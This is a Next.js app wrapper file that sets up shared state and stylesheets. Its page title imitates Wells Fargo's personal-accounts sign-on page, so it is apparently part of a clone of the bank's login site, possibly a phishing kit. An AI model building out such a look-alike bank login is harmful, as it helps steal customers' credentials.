import "../styles/globals.css";
import "../styles/main2.css";
import "../styles/main.css";
import "../styles/none.css";
import type { AppProps } from "next/app";
import Head from "next/head";
import { createContext, useState } from "react";

export const DataContext = createContext({} as any);

function MyApp({ Component, pageProps }: AppProps) {
  const [data, setData] = useState();
  return (
    <DataContext.Provider value={{ data, setData }}>
      <Head>
        <link rel="shortcut icon" href="/favicon.ico" />
        <title>Sign On to View Your Personal Accounts | Wells Fargo</title>
      </Head>
      <Component {...pageProps} />
    </DataContext.Provider>
  );
}

export default MyApp;
